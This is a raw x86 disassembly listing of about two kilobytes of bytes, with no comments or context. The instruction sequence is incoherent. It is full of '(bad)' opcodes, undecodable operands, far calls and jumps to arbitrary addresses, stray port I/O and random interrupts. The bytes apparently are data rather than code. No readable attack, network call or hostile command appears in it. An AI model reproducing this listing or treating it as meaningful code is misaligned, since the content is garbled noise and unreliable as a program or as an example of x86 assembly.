  4155fc:	jmp    0x4155cd
  4155fe:	test   DWORD PTR [edi+ebx*2],ebp
  415601:	fs test eax,0xd704c6c2
  415607:	(bad)  
  41560a:	push   0x31
  41560c:	fisubr DWORD PTR [edx-0x75e28b93]
  415612:	adc    ebp,ebx
  415614:	pop    ebp
  415615:	dec    ebx
  415616:	loopne 0x415598
  415618:	or     al,0x1d
  41561a:	enter  0xf9f1,0xd7
  41561e:	retf   
  41561f:	fs mov ecx,0x7d54c051
  415625:	fsubr  QWORD PTR [ebx]
  415627:	retf   
  415628:	xchg   edx,eax
  415629:	mov    ?,ebp
  41562b:	mov    DWORD PTR [ecx-0x68],edi
  41562e:	lahf   
  41562f:	push   edx
  415630:	call   0xacd5:0x1ee7ab64
  415637:	ret    0x44e5
  41563a:	push   cs
  41563b:	test   eax,0x7120d2ff
  415640:	and    DWORD PTR [eax-0x48],ebx
  415643:	push   0x9809df87
  415648:	push   ebx
  415649:	cmp    BYTE PTR [esi],0x2
  41564c:	sahf   
  41564d:	aad    0x8
  41564f:	daa    
  415650:	fs fwait
  415652:	dec    esi
  415653:	fidivr DWORD PTR [edi+0x13]
  415656:	jle    0x415658
  415658:	mov    ebx,0xfaca6e55
  41565d:	pop    ds
  41565e:	xor    DWORD PTR [ebp+0x7009bff6],esp
  415664:	ret    
  415665:	inc    edx
  415666:	xor    eax,0xc1473a2f
  41566b:	call   0xf413886b
  415670:	sub    ecx,ecx
  415672:	add    al,BYTE PTR [eax-0x5e67e12]
  415678:	fdivr  QWORD PTR [eax]
  41567a:	inc    esp
  41567b:	test   DWORD PTR [ecx-0x338376cf],ebx
  415681:	gs out dx,eax
  415683:	sti    
  415684:	push   ds
  415685:	cmp    eax,0xaab8a808
  41568a:	loop   0x415645
  41568c:	mov    ch,0x13
  41568e:	push   ebx
  41568f:	dec    edi
  415690:	xor    edx,esp
  415692:	test   al,0xd7
  415694:	ror    BYTE PTR [eax-0x11],1
  415697:	fnstsw WORD PTR [edx+0x39]
  41569a:	(bad)
  41569d:	mov    esi,0xf2a32b90
  4156a2:	mov    bh,0xf6
  4156a4:	pop    edx
  4156a5:	fs cmp WORD PTR ss:[eax-0x124ea065],0xffe3
  4156af:	mov    eax,0xfcae1f03
  4156b4:	iret   
  4156b5:	pop    ecx
  4156b6:	sub    BYTE PTR [eax],cl
  4156b8:	sub    eax,0x3e97c876
  4156bd:	push   cs
  4156be:	jmp    0x125cea43
  4156c3:	dec    eax
  4156c4:	add    eax,0x88e8ba32
  4156c9:	mov    ebx,0x9feb64ba
  4156ce:	xor    esi,edx
  4156d0:	outs   dx,DWORD PTR ds:[esi]
  4156d1:	dec    ecx
  4156d2:	inc    edi
  4156d3:	mov    ch,0x34
  4156d5:	aad    0x4f
  4156d7:	cmp    DWORD PTR ds:[ebp+0x12],esi
  4156db:	cmp    ecx,eax
  4156dd:	sub    esi,eax
  4156df:	sbb    al,0xf9
  4156e1:	(bad)  
  4156e2:	lods   al,BYTE PTR ds:[esi]
  4156e3:	mov    bh,0x3a
  4156e5:	and    eax,0xff9d9b5a
  4156ea:	jecxz  0x4156c1
  4156ec:	jne    0x415701
  4156ee:	add    dl,0x69
  4156f1:	cmovle ebp,DWORD PTR [edi-0x44]
  4156f5:	lds    ebx,FWORD PTR [ebx+esi*4-0x695bd695]
  4156fc:	dec    ebx
  4156fd:	stos   DWORD PTR es:[edi],eax
  4156fe:	rol    esp,1
  415700:	mov    BYTE PTR ds:0x719e9432,bl
  415706:	jb     0x415783
  415708:	and    esi,0x6873c3cc
  41570e:	pop    eax
  41570f:	jg     0x41574a
  415711:	add    al,0x9
  415713:	mov    bh,0x1b
  415715:	data16 daa 
  415717:	lods   al,BYTE PTR ds:[esi]
  415718:	pop    ss
  415719:	mov    esi,0xa021583e
  41571e:	(bad)  [eax+edx*4+0x3e1a08aa]
  415725:	call   0x51210a0a
  41572a:	out    dx,al
  41572b:	mov    dh,0xef
  41572d:	jmp    0x41577b
  41572f:	mov    ah,0x7a
  415731:	ja     0x4156cc
  415733:	jle    0x415747
  415735:	retf   0xc295
  415738:	(bad)  
  415739:	dec    ebp
  41573a:	js     0x415785
  41573c:	stos   DWORD PTR es:[edi],eax
  41573d:	loope  0x41579b
  41573f:	mov    ah,0xfc
  415741:	call   0x5048f295
  415746:	fcmovu st,st(1)
  415748:	mov    BYTE PTR [ebx+0x114fd629],cl
  41574e:	lock (bad) 
  415750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415751:	jo     0x415773
  415753:	shl    BYTE PTR [edi-0x6ff15df2],cl
  415759:	ror    bl,cl
  41575b:	and    DWORD PTR ds:[eax*4-0x67596955],esp
  415763:	cmp    ah,ah
  415765:	fimul  DWORD PTR [ebx]
  415767:	xor    eax,0x72c62347
  41576c:	ins    DWORD PTR es:[edi],dx
  41576d:	and    ebp,DWORD PTR [edi-0x49]
  415770:	jo     0x41571a
  415772:	mov    al,ds:0x2b56ea85
  415777:	xor    ebx,DWORD PTR [ebx+ecx*8+0x42]
  41577b:	sar    dl,1
  41577d:	push   ds
  41577e:	inc    ebx
  41577f:	test   ch,0x85
  415782:	push   esp
  415783:	jle    0x415770
  415785:	sbb    DWORD PTR [edx+eiz*1-0x6ccc6e9b],edx
  41578c:	sti    
  41578d:	repz or al,0xbc
  415790:	sub    eax,0x17fca1e0
  415795:	jo     0x41577c
  415797:	lea    edi,ds:0x4605353d
  41579d:	in     eax,0xb2
  41579f:	push   cs
  4157a0:	ficom  WORD PTR ds:0xab02d202
  4157a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157a7:	xor    al,0xa8
  4157a9:	neg    DWORD PTR [eax+0x685a3ad9]
  4157af:	aaa    
  4157b0:	add    DWORD PTR [ebx+0x18b09a4e],esp
  4157b6:	jecxz  0x41577e
  4157b8:	jno    0x415824
  4157ba:	outs   dx,DWORD PTR ds:[esi]
  4157bb:	add    DWORD PTR [esi+eax*4-0x66735b20],ebp
  4157c2:	jle    0x4157fb
  4157c4:	or     edx,DWORD PTR [ebp+ebx*2-0x32]
  4157c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157c9:	fild   DWORD PTR [ebp-0x61]
  4157cc:	and    eax,0xedeb6015
  4157d1:	dec    esi
  4157d2:	xchg   edx,eax
  4157d3:	mov    eax,DWORD PTR [ecx-0x5dff1e5f]
  4157d9:	or     BYTE PTR [eax-0x30],0x37
  4157dd:	push   0x45
  4157df:	xchg   esi,eax
  4157e0:	lock push ecx
  4157e2:	add    eax,0x29f544be
  4157e7:	in     al,dx
  4157e8:	out    dx,al
  4157e9:	jne    0x41584b
  4157eb:	dec    ebx
  4157ec:	fstp   QWORD PTR [edx+ebx*8]
  4157ef:	adc    DWORD PTR [esp+eax*4],edi
  4157f2:	inc    ebx
  4157f3:	push   ecx
  4157f4:	into   
  4157f5:	(bad)  
  4157f6:	sti    
  4157f7:	cdq    
  4157f8:	mov    eax,ds:0xcaa9db3d
  4157fd:	xchg   ebx,eax
  4157fe:	(bad)  
  4157ff:	retf   0x79f7
  415802:	idiv   edi
  415804:	mov    ?,edx
  415806:	ror    bh,1
  415808:	shr    edi,0xc7
  41580b:	int    0x87
  41580d:	jle    0x4157e3
  41580f:	inc    ebp
  415810:	dec    eax
  415811:	jbe    0x41581b
  415813:	int3   
  415814:	retf   
  415815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415816:	and    esi,DWORD PTR [ebp+0x48]
  415819:	psubsb mm6,QWORD PTR [ecx+0xb156cb1]
  415820:	(bad)  
  415822:	in     eax,0x25
  415824:	push   ds
  415825:	in     al,0xf4
  415827:	pop    ecx
  415828:	and    DWORD PTR [ecx-0x45712d16],ebp
  41582e:	adc    al,cl
  415830:	(bad)  
  415831:	cmp    al,0x62
  415833:	outs   dx,DWORD PTR ds:[esi]
  415834:	nop
  415835:	pop    edi
  415836:	adc    al,0x6f
  415838:	jne    0x415825
  41583a:	popa   
  41583b:	pop    es
  41583c:	cmp    ecx,DWORD PTR [edi-0x2761ebd]
  415842:	fsub   QWORD PTR [ebx-0xe03f217]
  415848:	and    esp,DWORD PTR [ebx-0x49329c30]
  41584e:	push   esp
  41584f:	xchg   ebx,eax
  415850:	fdivr  QWORD PTR [ecx]
  415852:	fwait
  415853:	xor    edi,edx
  415855:	and    al,0x74
  415857:	adc    DWORD PTR [eax+0xcbece],ebx
  41585d:	mov    esp,0x62c28899
  415862:	push   ebx
  415863:	imul   eax,DWORD PTR [eax+ecx*8-0x718ac7d2],0xf46b495a
  41586e:	inc    eax
  41586f:	mov    dl,0x6d
  415871:	mov    edx,0x93ca6e7d
  415876:	dec    esp
  415877:	sub    dl,BYTE PTR [edx]
  415879:	mov    esp,DWORD PTR es:[eax]
  41587c:	sbb    DWORD PTR [ecx+0xcda120f],ecx
  415882:	push   ebp
  415883:	inc    eax
  415884:	xor    BYTE PTR [ecx],0xef
  415887:	popa   
  415888:	jmp    0x9dc2a25d
  41588d:	jle    0x415850
  41588f:	arpl   WORD PTR [edi-0x38],sp
  415892:	fs jge 0x4158fb
  415895:	sbb    ebp,DWORD PTR [ebx*2-0x1c17bb7b]
  41589c:	sub    ch,BYTE PTR [ebp+0x70]
  41589f:	xchg   ebp,eax
  4158a0:	mov    dh,0x26
  4158a2:	xlat   BYTE PTR cs:[ebx]
  4158a4:	rcl    DWORD PTR [ecx],1
  4158a6:	sti    
  4158a7:	test   eax,0xb9d192b1
  4158ac:	mov    ah,0x5e
  4158ae:	mov    ds:0x1de3c630,al
  4158b3:	cmp    BYTE PTR [ebp+ebp*8+0x6e],ah
  4158b7:	arpl   WORD PTR [esi+0x47],sp
  4158ba:	pop    ebx
  4158bb:	mov    ds:0x8ce18be1,eax
  4158c0:	dec    esp
  4158c1:	mov    WORD PTR [edi],ss
  4158c3:	(bad)  [esi-0x26155c9]
  4158c9:	call   0xdd2a:0x17209135
  4158d0:	lds    eax,FWORD PTR [esi+ecx*1+0x6286f60]
  4158d7:	(bad)  
  4158d8:	lds    esi,FWORD PTR [edx-0x1f0de5fe]
  4158de:	push   0x4
  4158e0:	call   0x12e5:0xc48c905e
  4158e7:	adc    BYTE PTR ds:0x2d2b9527,al
  4158ed:	adc    esp,eax
  4158ef:	sub    eax,0x48f94f2b
  4158f4:	scas   eax,DWORD PTR es:[edi]
  4158f5:	mov    esp,0xd8cd78bd
  4158fa:	(bad)  
  4158fb:	pop    esp
  4158fc:	mov    esp,0xf778ab78
  415901:	mov    ?,WORD PTR [ebx+0x7df2a887]
  415907:	add    esi,DWORD PTR [esi+0x23]
  41590a:	pop    ss
  41590b:	dec    ecx
  41590c:	xchg   esi,eax
  41590d:	pusha  
  41590e:	out    dx,al
  41590f:	mov    al,0x10
  415911:	sbb    DWORD PTR [ebx-0x39],esi
  415914:	dec    esi
  415915:	pushf  
  415916:	pushf  
  415917:	jb     0x415935
  415919:	push   ss
  41591a:	xor    BYTE PTR [ebx+esi*8],dh
  41591d:	sbb    al,BYTE PTR [esi+edx*8+0x71]
  415921:	std    
  415922:	jmp    0x5343:0xc5d81f5c
  415929:	add    DWORD PTR [ecx],esp
  41592b:	dec    eax
  41592c:	dec    eax
  41592d:	outs   dx,BYTE PTR ds:[esi]
  41592e:	jmp    0x4158e7
  415930:	mov    dh,0xad
  415932:	(bad)  
  415933:	call   0xc49a:0xa584563f
  41593a:	in     al,0x22
  41593c:	int    0x1a
  41593e:	push   ebx
  41593f:	jmp    0xe1777db0
  415944:	adc    edx,DWORD PTR [edx-0x67cf7bdd]
  41594a:	jnp    0x4158f6
  41594c:	fsubrp st(0),st
  41594e:	jns    0x415979
  415950:	xchg   edx,eax
  415951:	icebp  
  415952:	outs   dx,DWORD PTR ds:[esi]
  415953:	(bad)  
  415954:	pop    ebx
  415955:	xchg   ebp,eax
  415956:	ret    0x9104
  415959:	dec    edi
  41595a:	jbe    0x415933
  41595c:	in     al,dx
  41595d:	in     al,0xa
  41595f:	and    bl,BYTE PTR [eax-0x7213f288]
  415965:	(bad)  
  415967:	(bad)  
  415968:	iret   
  415969:	mov    BYTE PTR [ebp+0x7c],al
  41596c:	mov    edi,0xbaf8f7dc
  415971:	mov    cl,bl
  415973:	(bad)  
  415975:	scas   eax,DWORD PTR es:[edi]
  415976:	and    dh,0xe0
  415979:	inc    BYTE PTR [edi-0x620a329c]
  41597f:	aad    0x5a
  415981:	inc    esi
  415982:	data16 jmp 0x4159d7
  415985:	pop    edx
  415986:	lock aas 
  415988:	sbb    edx,eax
  41598a:	push   ds
  41598b:	mov    ebp,0xe8037f9c
  415990:	pusha  
  415991:	out    dx,eax
  415992:	call   0xc63e7c70
  415997:	dec    ebp
  415998:	pop    esi
  415999:	fcomp  QWORD PTR [ebx-0x1e6f5967]
  41599f:	mov    bh,0x63
  4159a1:	sbb    al,BYTE PTR [ebp+0x268b08ab]
  4159a7:	mov    cl,0xc
  4159a9:	pop    ss
  4159aa:	xor    DWORD PTR [edi+0x56],edx
  4159ad:	or     eax,0xed5a6edb
  4159b2:	pushf  
  4159b3:	out    0x58,al
  4159b5:	test   al,0x5b
  4159b7:	xchg   ecx,eax
  4159b8:	fldenv [edi+0x3]
  4159bb:	push   cs
  4159bc:	das    
  4159bd:	add    BYTE PTR [esp+edx*8-0x777c6b88],0x81
  4159c5:	loop   0x415a3d
  4159c7:	xor    al,0xaf
  4159c9:	add    DWORD PTR [ebx+0x5d],ecx
  4159cc:	data16 icebp 
  4159ce:	psubd  mm6,QWORD PTR [edx+0x7dc6127e]
  4159d5:	test   BYTE PTR [edi-0x73d64f02],dl
  4159db:	adc    BYTE PTR [edi],ch
  4159dd:	jp     0x415a5d
  4159df:	cmp    BYTE PTR [eax+0x1746eaf],cl
  4159e5:	push   cs
  4159e6:	pop    ebx
  4159e7:	aaa    
  4159e8:	out    dx,eax
  4159e9:	fld    QWORD PTR [eax]
  4159eb:	pusha  
  4159ec:	repz mov al,ds:0x83de4c94
  4159f2:	shl    bh,0xdc
  4159f5:	pop    esp
  4159f6:	ins    BYTE PTR es:[edi],dx
  4159f7:	pop    esp
  4159f8:	dec    ecx
  4159f9:	jge    0x4159b6
  4159fb:	xchg   DWORD PTR [edx-0x25e92a98],edi
  415a01:	mov    ebx,0xc6185268
  415a06:	pop    edi
  415a07:	add    dl,0x6
  415a0a:	mov    ebp,0x1a766d46
  415a0f:	xchg   esp,eax
  415a10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a11:	mov    cs,ebp
  415a13:	stc    
  415a14:	fst    QWORD PTR [ebx+esi*1+0x38a42b08]
  415a1b:	mov    BYTE PTR [edi+0x59],dl
  415a1e:	sub    al,0xa0
  415a20:	imul   esi,esi,0x18bfc0b
  415a26:	mov    ah,0xe
  415a28:	xchg   esi,eax
  415a29:	clc    
  415a2a:	pop    ecx
  415a2b:	mov    ch,0x7e
  415a2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a2e:	les    esi,FWORD PTR [edi]
  415a30:	out    dx,al
  415a31:	imul   edi,DWORD PTR [ecx+0x56],0x79
  415a35:	ss push 0xffffffda
  415a38:	jb     0x415aa8
  415a3a:	addr16 aas 
  415a3c:	shl    bh,0xe7
  415a3f:	push   ss
  415a40:	push   ebx
  415a41:	iret   
  415a42:	xchg   BYTE PTR [ebx+0x6f237317],bh
  415a48:	addr16 xor al,0xee
  415a4b:	mov    fs,WORD PTR [esi+0x5d0e8100]
  415a51:	mov    ebx,0x196b613e
  415a56:	rol    dh,1
  415a58:	push   0xcb9a67c2
  415a5d:	mov    DWORD PTR [edx-0x7b628fe3],ebp
  415a63:	scas   al,BYTE PTR es:[edi]
  415a64:	inc    ebp
  415a65:	xor    al,0x8e
  415a67:	jl     0x415aad
  415a69:	aad    0x57
  415a6b:	ror    DWORD PTR [edi-0x7c],0x33
  415a6f:	xor    al,0xc6
  415a71:	imul   edi,DWORD PTR [ecx+0x52],0xffffff8e
  415a75:	neg    DWORD PTR [edi]
  415a77:	test   DWORD PTR [esi-0x7c68b91c],ebp
  415a7d:	ret    0x9c7
  415a80:	mov    edi,0x9c3580eb
  415a85:	imul   BYTE PTR [ebx]
  415a87:	cmc    
  415a88:	xchg   edi,eax
  415a89:	arpl   WORD PTR [ebx+0x54e2ff68],si
  415a8f:	ja     0x415a34
  415a91:	add    eax,0xf82a38b1
  415a96:	jle    0x415aa9
  415a98:	push   ecx
  415a99:	je     0x415ad9
  415a9b:	dec    ebx
  415a9c:	aad    0xbd
  415a9e:	mov    dh,0x72
  415aa0:	xchg   ebp,eax
  415aa1:	dec    edi
  415aa2:	lock cdq 
  415aa4:	lock xor eax,0x77647b4e
  415aaa:	lods   eax,DWORD PTR ds:[esi]
  415aab:	fcom   QWORD PTR [edx+0x397795d5]
  415ab1:	retf   0x74c1
  415ab4:	cmp    BYTE PTR [esi-0x5c],dl
  415ab7:	mov    DWORD PTR [ebp+0x63],esp
  415aba:	mov    edi,0xb776f6be
  415abf:	lods   al,BYTE PTR ds:[esi]
  415ac0:	jge    0x415a72
  415ac2:	xchg   ebp,eax
  415ac3:	xor    BYTE PTR [edi-0x3fd32412],dl
  415ac9:	test   DWORD PTR [edx-0x72afdd58],ebx
  415acf:	cmp    al,0x91
  415ad1:	inc    ebp
  415ad2:	dec    edi
  415ad3:	push   edi
  415ad4:	stos   DWORD PTR es:[edi],eax
  415ad5:	stos   BYTE PTR es:[edi],al
  415ad6:	push   ecx
  415ad7:	into   
  415ad8:	add    al,0xc1
  415ada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415adb:	iret   
  415adc:	lods   eax,DWORD PTR ds:[esi]
  415add:	sub    DWORD PTR [ecx],ecx
  415adf:	fisubr WORD PTR [ebx]
  415ae1:	push   ds
  415ae2:	push   0x4181c8a6
  415ae7:	int3   
  415ae8:	xchg   esp,eax
  415ae9:	dec    ebx
  415aea:	sbb    eax,ecx
  415aec:	jge    0x415b57
  415aee:	xchg   esi,eax
  415aef:	pop    ds
  415af0:	cmp    eax,0x80ae8d6a
  415af5:	jmp    0x95607192
  415afa:	dec    eax
  415afb:	jle    0x415aa3
  415afd:	adc    cl,BYTE PTR [edx+0x1106a89d]
  415b03:	sub    ah,ch
  415b05:	gs or  eax,0xe99ba3d8
  415b0b:	pop    ds
  415b0c:	and    esi,0x67ce882a
  415b12:	ins    DWORD PTR es:[edi],dx
  415b13:	cmp    DWORD PTR [esi-0x67],ebp
  415b16:	xchg   ecx,eax
  415b17:	push   ecx
  415b18:	jecxz  0x415af3
  415b1a:	dec    edi
  415b1b:	fwait
  415b1c:	pop    ds
  415b1d:	pop    esi
  415b1e:	mov    ecx,0xc95d7c74
  415b23:	test   al,0x6e
  415b25:	out    0x6,eax
  415b27:	push   esp
  415b28:	sub    DWORD PTR [ebp-0x11876ad2],ebp
  415b2e:	push   edi
  415b2f:	frstor [edx-0x4b]
  415b32:	test   eax,0xf897ed80
  415b37:	mov    DWORD PTR [ebp-0x527be2fe],edi
  415b3d:	mov    eax,0x6818b8bc
  415b42:	dec    edi
  415b43:	and    BYTE PTR [edi],0x4e
  415b46:	nop    ecx
  415b49:	aad    0x62
  415b4b:	es sqrtps xmm6,xmm3
  415b4f:	xor    bh,bl
  415b51:	rcr    BYTE PTR [eax],0x99
  415b54:	or     DWORD PTR [edi+0x2],0x2a
  415b58:	cmp    dl,BYTE PTR [edi]
  415b5a:	sahf   
  415b5b:	(bad)  
  415b5c:	push   0xe86817e7
  415b61:	or     al,0xb9
  415b63:	retfw  0x97a1
  415b67:	mov    ebp,esp
  415b69:	jb     0x415b4d
  415b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b6c:	mov    ah,al
  415b6e:	addr16 (bad) 
  415b70:	mov    eax,0x59ac6cc
  415b75:	test   eax,ebx
  415b77:	in     eax,dx
  415b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b79:	out    0xf6,al
  415b7b:	push   es
  415b7c:	sbb    al,0x1a
  415b7e:	inc    edi
  415b7f:	mov    edi,0x71f4cd17
  415b84:	add    DWORD PTR [esi-0x26d476f3],0xdac31d57
  415b8e:	ret    
  415b8f:	ja     0x415b5b
  415b91:	mov    edx,0x40c8f0a8
  415b96:	dec    ebp
  415b97:	xor    esp,DWORD PTR [ebx-0x5d]
  415b9a:	inc    esi
  415b9b:	adc    eax,0x9a6c5884
  415ba0:	jae    0x415b78
  415ba2:	inc    edi
  415ba3:	ins    DWORD PTR es:[edi],dx
  415ba4:	inc    edx
  415ba5:	lock push ss
  415ba7:	jecxz  0x415c0b
  415ba9:	jno    0x415c1a
  415bab:	jmp    0x7773893f
  415bb0:	ret    
  415bb1:	scas   al,BYTE PTR es:[edi]
  415bb2:	or     edi,edx
  415bb4:	mov    al,0xd
  415bb6:	and    BYTE PTR [ebx+0x46dc3fca],0xe8
  415bbd:	in     al,0x1b
  415bbf:	lock rcr BYTE PTR [eax+0x1eedfd46],0xa0
  415bc7:	je     0x415bb5
  415bc9:	(bad)  
  415bcb:	dec    esp
  415bcc:	daa    
  415bcd:	jle    0x415bad
  415bcf:	push   ebp
  415bd0:	mov    al,ds:0x141b28e
  415bd5:	test   eax,0x3c8b7074
  415bda:	push   es
  415bdb:	dec    esp
  415bdc:	arpl   WORD PTR [ebx],bp
  415bde:	inc    edx
  415bdf:	mov    dh,0xde
  415be1:	clc    
  415be2:	lods   eax,DWORD PTR ds:[esi]
  415be3:	inc    ebx
  415be4:	push   edi
  415be5:	jecxz  0x415be8
  415be7:	sbb    al,ch
  415be9:	in     al,dx
  415bea:	dec    ebp
  415beb:	cld    
  415bec:	or     DWORD PTR [esi+eiz*1+0x36ec18a7],eax
  415bf3:	inc    edx
  415bf4:	ss pop edi
  415bf6:	ja     0x415ba5
  415bf8:	xchg   ecx,eax
  415bf9:	fstp   DWORD PTR [edx+0x7f]
  415bfc:	fistp  DWORD PTR ds:0x9b348ba6
  415c02:	jbe    0x415c7a
  415c04:	mov    DWORD PTR [eax-0x27b397da],esp
  415c0a:	in     eax,dx
  415c0b:	and    BYTE PTR [esi-0x1d50658f],bl
  415c11:	cmp    eax,0xa7b0aa05
  415c16:	jg     0x415c3d
  415c18:	out    0xcf,al
  415c1a:	cmp    al,0x9b
  415c1c:	(bad)  
  415c1d:	mov    edx,0x1a75e934
  415c22:	mov    esi,0xeec22676
  415c27:	sbb    al,0xd0
  415c29:	pop    eax
  415c2a:	add    BYTE PTR fs:[eax],dl
  415c2d:	es js  0x415bbf
  415c30:	adc    dl,cl
  415c32:	sub    eax,0x3f19c160
  415c37:	pop    eax
  415c38:	aaa    
  415c39:	add    bl,BYTE PTR [ebx+edi*1+0x6]
  415c3d:	imul   ebp,eax,0xffffffa6
  415c40:	mov    ecx,0x7a730d45
  415c45:	scas   eax,DWORD PTR es:[edi]
  415c46:	imul   edx,DWORD PTR cs:[edi],0xffffffc4
  415c4a:	call   0x252aecd5
  415c4f:	dec    ecx
  415c50:	dec    esp
  415c51:	xchg   esp,eax
  415c52:	lar    edi,WORD PTR [edx]
  415c55:	int    0x12
  415c57:	dec    BYTE PTR [ecx]
  415c59:	lods   eax,DWORD PTR ds:[esi]
  415c5a:	(bad)  
  415c5b:	repnz div BYTE PTR [ecx]
  415c5e:	int    0x52
  415c60:	loopne 0x415c4b
  415c62:	pop    ss
  415c63:	xor    eax,0x3cae0ed
  415c68:	repnz xchg esp,eax
  415c6a:	dec    esi
  415c6b:	mov    ecx,0x950209f6
  415c70:	pop    ecx
  415c71:	sub    dl,ch
  415c73:	push   ds
  415c74:	mov    ?,WORD PTR [ebx]
  415c76:	inc    edi
  415c77:	mov    DWORD PTR [edx-0x1e],ecx
  415c7a:	fld    DWORD PTR ds:0x59ab12f4
  415c80:	or     al,0x3d
  415c82:	fcom   st(5)
  415c84:	lds    edi,FWORD PTR [esp+edx*2-0x1301fc98]
  415c8b:	cwde   
  415c8c:	pop    edi
  415c8d:	add    BYTE PTR [ecx+0x1b],dh
  415c90:	rcl    DWORD PTR [ecx+ebx*8-0x47],1
  415c94:	xchg   edx,eax
  415c95:	cmp    BYTE PTR [edi+eax*8],al
  415c98:	bnd jnp 0x415ceb
  415c9b:	and    eax,0x8231d077
  415ca0:	or     al,0xcf
  415ca2:	cmc    
  415ca3:	pop    esp
  415ca4:	sub    DWORD PTR [edi+0x637b59cf],esi
  415caa:	sbb    al,0xad
  415cac:	dec    ecx
  415cad:	dec    ecx
  415cae:	sti    
  415caf:	int    0x77
  415cb1:	adc    al,0x76
  415cb3:	mov    ?,esi
  415cb5:	in     eax,0xeb
  415cb7:	mov    esp,0x10b196b4
  415cbc:	cdq    
  415cbd:	cmp    bl,0xe1
  415cc0:	loope  0x415d25
  415cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cc3:	jp     0x415d41
  415cc5:	and    esp,DWORD PTR [ecx+0x231d56de]
  415ccb:	pushf  
  415ccc:	repz and BYTE PTR [eax],dh
  415ccf:	pusha  
  415cd0:	xchg   esp,eax
  415cd1:	out    0xce,eax
  415cd3:	cwde   
  415cd4:	jne    0x415d04
  415cd6:	jns    0x415c64
  415cd8:	repz push 0xffffff9f
  415cdb:	jb     0x415d32
  415cdd:	ror    bh,0xe2
  415ce0:	mov    ch,0x19
  415ce2:	adc    BYTE PTR [ecx-0x784ed0e],ch
  415ce8:	mov    edx,0xab734410
  415ced:	(bad)  
  415cee:	fbld   TBYTE PTR [ecx+0x31]
  415cf1:	mov    ebp,DWORD PTR [ebx]
  415cf3:	out    0x48,eax
  415cf5:	add    cl,bl
  415cf7:	icebp  
  415cf8:	cli    
  415cf9:	or     ah,BYTE PTR [eax+0x25]
  415cfc:	push   esi
  415cfd:	mov    ebx,0x1f1f016a
  415d02:	bound  edi,QWORD PTR [ebp+0x4a]
  415d05:	jns    0x415c8c
  415d07:	and    al,0x92
  415d09:	sub    eax,0x27f0edef
  415d0e:	mov    bl,0xab
  415d10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d11:	push   ebp
  415d12:	dec    ebp
  415d13:	sub    al,0xc8
  415d15:	ja     0x415d67
  415d17:	jmp    0x27fe7c45
  415d1c:	pop    esi
  415d1d:	retf   0xdfb0
  415d20:	repz out dx,eax
  415d22:	sub    ch,BYTE PTR [ebx]
  415d24:	adc    edx,DWORD PTR [eiz*1+0x2cadcaf2]
  415d2b:	div    BYTE PTR [edi+0x72e7b538]
  415d31:	test   al,0xaf
  415d33:	adc    DWORD PTR ds:0x84d5ce12,edi
  415d39:	scas   al,BYTE PTR es:[edi]
  415d3a:	loope  0x415d2e
  415d3c:	push   eax
  415d3d:	(bad)  
  415d3e:	cmp    BYTE PTR [edx],al
  415d40:	pop    ss
  415d41:	xor    BYTE PTR [eax-0x39],bl
  415d44:	int3   
  415d45:	adc    cl,dl
  415d47:	(bad)  
  415d48:	je     0x415ce5
  415d4a:	mov    WORD PTR [eax+0x7d],gs
  415d4d:	xchg   ebp,eax
  415d4e:	cmp    BYTE PTR [esi-0x5f],bl
  415d51:	push   ds
  415d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d53:	mov    esi,0x2e3859fb
  415d58:	inc    edi
  415d59:	jne    0x415da0
  415d5b:	jo     0x415d4b
  415d5d:	loop   0x415d53
  415d5f:	(bad)  
  415d60:	(bad)  
  415d61:	xchg   esp,eax
  415d62:	test   eax,0xc5affbf2
  415d67:	nop
  415d68:	stc    
  415d69:	es gs retf 
  415d6c:	mov    ch,BYTE PTR ds:0x77665d06
  415d72:	pop    ds
  415d73:	sub    al,0x4c
  415d75:	repz ret 
  415d77:	cdq    
  415d78:	dec    ecx
  415d79:	enter  0x3319,0xd0
  415d7d:	stos   DWORD PTR es:[edi],eax
  415d7e:	mov    esp,0x14666e79
  415d83:	in     al,0x78
  415d85:	popf   
  415d86:	mov    DWORD PTR [edi],ebx
  415d88:	test   eax,0x7d82cb67
  415d8d:	or     DWORD PTR ds:0x99211bd0,0x5029cfd9
  415d97:	jno    0x415d9b
  415d99:	jbe    0x415d83
  415d9b:	fnstenv [esi+ebx*1+0x28adbeb2]
  415da2:	stos   BYTE PTR es:[edi],al
  415da3:	sbb    DWORD PTR [edx-0x36],esp
  415da6:	sbb    DWORD PTR [eax+0xe4d3d83],0xe6a65b07
  415db0:	mov    ecx,DWORD PTR [edi-0x22]
  415db3:	jb     0x327b9925
  415db9:	xchg   ebp,eax
  415dba:	xchg   edi,eax
  415dbb:	jno    0x415d6e
  415dbd:	jno    0x415d97
  415dbf:	cli    
  415dc0:	xor    eax,0x6a5ac0c0
  415dc5:	pusha  
  415dc6:	xchg   esp,eax
  415dc7:	nop
  415dc8:	(bad)  [eax]
  415dca:	jb     0x415e13
  415dcc:	int3   
  415dcd:	imul   esi,DWORD PTR [eax],0x91c215de
  415dd3:	xor    eax,0x10eb3c1f
  415dd8:	cmp    DWORD PTR [esi+0x12c151bf],eax
  415dde:	das    
  415ddf:	(bad)  
  415de0:	push   esi
  415de1:	rcl    BYTE PTR [esi+0x59ad3f49],1
  415de7:	mov    eax,0x19f72390
  415dec:	xchg   ebp,eax
  415ded:	jmp    0x129d2772
  415df2:	pop    esp
  415df3:	enter  0x273,0x7f
  415df7:	push   cs
  415df8:	lods   al,BYTE PTR ds:[esi]
  415df9:	mov    ch,ah
  415dfb:	sbb    al,0xc9
  415dfd:	mov    edi,0x66a76ab8
  415e02:	jns    0x415e70
  415e04:	push   0xfdaeb5a
  415e09:	fstp   DWORD PTR [edx]
  415e0b:	adc    dh,dl
  415e0d:	jbe    0x415de4
  415e0f:	mov    dh,0xa4
  415e11:	sub    al,0x1
  415e13:	jmp    0x415db8
  415e15:	mov    ebx,0x9a637c46
